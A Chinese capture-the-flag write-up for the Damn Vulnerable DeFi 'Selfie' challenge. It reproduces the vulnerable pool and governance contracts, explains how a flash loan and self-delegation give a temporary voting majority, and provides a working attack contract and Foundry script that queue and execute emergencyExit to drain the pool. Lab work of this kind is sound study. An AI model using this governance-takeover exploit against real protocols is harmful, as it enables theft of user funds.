# Selfie

# 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableVotes} from "./DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

//0x5FbDB2315678afecb367f032d93F642f64180aa3
contract Setup {
    uint256 public constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 public constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes public token;
    SimpleGovernance public governance;
    SelfiePool public pool;


    constructor() {
       
        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund pool
        token.transfer(address(pool), TOKENS_IN_POOL);
    }

    function isSolved() external view returns (bool) {
        return token.balanceOf(address(pool)) == 0;
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";

contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    IERC20 public immutable token;
    SimpleGovernance public immutable governance;

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event EmergencyExit(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token) {
            return token.balanceOf(address(this));
        }
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token) {
            revert UnsupportedCurrency();
        }
        return 0;
    }

    //关键函数
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableVotes} from "./DamnValuableVotes.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract SimpleGovernance is ISimpleGovernance {
    using Address for address;

    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;

    DamnValuableVotes private _votingToken;
    uint256 private _actionCounter;
    mapping(uint256 => GovernanceAction) private _actions;

    constructor(DamnValuableVotes votingToken) {
        _votingToken = votingToken;
        _actionCounter = 1;
    }

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }

        if (target == address(this)) {
            revert InvalidTarget();
        }

        if (data.length > 0 && target.code.length == 0) {
            revert TargetMustHaveCode();
        }

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked {
            _actionCounter++;
        }

        emit ActionQueued(actionId, msg.sender);
    }

    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if (!_canBeExecuted(actionId)) {
            revert CannotExecute(actionId);
        }

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
    }

    function getActionDelay() external pure returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    function getVotingToken() external view returns (address) {
        return address(_votingToken);
    }

    function getAction(uint256 actionId) external view returns (GovernanceAction memory) {
        return _actions[actionId];
    }

    function getActionCounter() external view returns (uint256) {
        return _actionCounter;
    }

 

    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = _actions[actionId];

        if (actionToExecute.proposedAt == 0) return false;

        uint64 timeDelta;
        unchecked {
            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
        }

        return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;//必须>50% 投票权，至少需要 1,000,001
        return balance > halfTotalSupply;
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {ERC20Votes} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import {Nonces} from "@openzeppelin/contracts/utils/Nonces.sol";

contract DamnValuableVotes is ERC20, ERC20Permit, ERC20Votes {
    constructor(uint256 supply) ERC20("DamnValuableVotes", "DVV") ERC20Permit("DamnValuableVotes") {
        _mint(msg.sender, supply);
    }

    function _update(address from, address to, uint256 amount) internal override(ERC20, ERC20Votes) {
        super._update(from, to, amount);
    }

    function nonces(address owner) public view virtual override(ERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

interface ISimpleGovernance {
    struct GovernanceAction {
        uint128 value;
        uint64 proposedAt;
        uint64 executedAt;
        address target;
        bytes data;
    }

    error NotEnoughVotes(address who);
    error CannotExecute(uint256 actionId);
    error InvalidTarget();
    error TargetMustHaveCode();
    error ActionFailed(uint256 actionId);

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);
    function getActionDelay() external view returns (uint256 delay);
    function getVotingToken() external view returns (address token);
    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);
    function getActionCounter() external view returns (uint256);
}

```

# 思路

首先看`issolved()`,要求把pool池子的token掏空

```solidity
return token.balanceOf(address(pool)) == 0;
```

setup初始,pool里有1\_500\_000e18这么多token,那么就看谁有转走这些token的权利

来看selfiePool里的相关函数:

```solidity
 function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
```

注意到有一个`onlyGovernance`标识符,也就是说只有governance可以动pool里的token,那也就是说我们要想办法让 governance 合约替我们调用 `pool.emergencyExit(attacker)`

接着我们看`SimpleGovernance.queueAction`：

```solidity
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
  if (!_hasEnoughVotes(msg.sender)) {
    revert NotEnoughVotes(msg.sender);
  }
  ...
}
```

也就是说，**不是谁都能排治理提案**，必须先通过 `_hasEnoughVotes(msg.sender)`

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
  uint256 balance = _votingToken.getVotes(who);
  uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
  return balance > halfTotalSupply;
}
```

注意这里检查的不是 `balanceOf(who)`，而是：

```solidity
_votingToken.getVotes(who)
```

并且要求：

```solidity
balance > totalSupply / 2
```

总供应量是：

```solidity
TOKEN_INITIAL_SUPPLY = 2_000_000e18;
```

所以必须满足：

**投票权 > 1,000,000e18**

至少要超过一半，也就是至少 `1,000,000e18 + 1` 那个级别

那现在的目标就明确了,我们需要拿到至少一半以上的投票权,然后调用函数提走token

`queueAction` 要求提案人拥有超过总代币一半的投票权。总代币是 200 万，过半就是超过 100 万。而池子里正好有 150 万 token。

pool 支持 flashLoan，所以我们可以临时借出这 150 万 token。flashLoan 的执行顺序是先转币给借款人，再调用借款人的 `onFlashLoan` 回调，最后才检查还款。也就是说，在回调函数里，攻击合约会短暂持有 150 万 token。

由于这个 token 是 `ERC20Votes`，治理读取的是 `getVotes`，不是 `balanceOf`，所以在回调里要先 `delegate(address(this))`，把投票权委托给自己。这样攻击合约就拥有了超过一半的治理票数。

接着在回调里调用 `queueAction`，把 `pool.emergencyExit(attacker)` 这个恶意操作加入治理队列。然后再 `approve` 给 pool，把 flashLoan 归还。

虽然 token 被还回去了，但治理系统只在 `queueAction` 的时候检查票数，后续 `executeAction` 不会重新检查，所以这个恶意提案仍然有效。

等两天治理延迟过去后，调用 `executeAction(actionId)`，governance 合约就会以合法身份调用 `pool.emergencyExit(attacker)`，最终把池子中全部 token 转给攻击合约,pool里的token清零

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.25;

import {Setup} from "./Setup.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {DamnValuableVotes} from "./DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attack {
    Setup public setup;
    SelfiePool public pool;
    DamnValuableVotes public token;
    SimpleGovernance public governance;

    uint256 actionId;

    constructor(address addr) {
        setup = Setup(addr);
        pool = SelfiePool(setup.pool());
        token = DamnValuableVotes(setup.token());
        governance = SimpleGovernance(setup.governance());
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        // 获取投票权
        token.delegate(address(this));
        // 提交治理提案
        actionId =
            governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", address(this)));
        // 归还 flashloan
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.25;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/1.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        attack.attack();
        vm.stopBroadcast();

        // vm.roll(block.number + 1);
        // vm.warp(block.timestamp + 2 days + 1);

        vm.startBroadcast();
        Attack attack = Attack(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);

        attack.execute();
        vm.stopBroadcast();
    }
}

```

其中脚本要forge script两次,先把下边那部分注释,然后终端用这个推进时间

```solidity
 cast rpc evm_increaseTime 172800
 cast rpc evm_mine
```

然后取消下部分注释,把上部分注释掉,再forgescript一次,就可以了


> 更新: 2026-03-16 21:16:17  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ssgptgq5kcplro4b>